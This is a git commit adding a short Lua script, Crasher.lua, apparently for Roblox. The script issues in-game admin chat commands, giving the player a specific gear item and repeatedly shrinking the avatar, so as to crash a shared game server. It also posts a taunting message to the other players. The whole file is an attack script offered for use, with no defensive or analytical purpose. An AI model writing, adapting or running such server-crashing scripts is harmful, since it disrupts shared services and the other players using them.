3bd8c0d44c92aa61264d16b3af7c3d75b63e46bc
Lewis-Collier <112239446+Lewis-Collier@users.noreply.github.com>
2023-08-04 11:19:05 +0100

    Create Crasher.lua

---
+++ Crasher.lua
@@ -0,0 +1,11 @@
+game.Players:Chat("gear me 94794847")
+game.Players:Chat("h equip to crash server, make sure u have no other tools or it wont work")
+wait(1.2)
+repeat
+wait()
+until #game.Players.LocalPlayer.Backpack:GetChildren() == 0
+wait(1)
+game.Players:Chat("m say bye to ur server.")
+game.Players:Chat("size me 0.3")
+game.Players:Chat("size me 0.3")
+game.Players:Chat("size me 0.3")
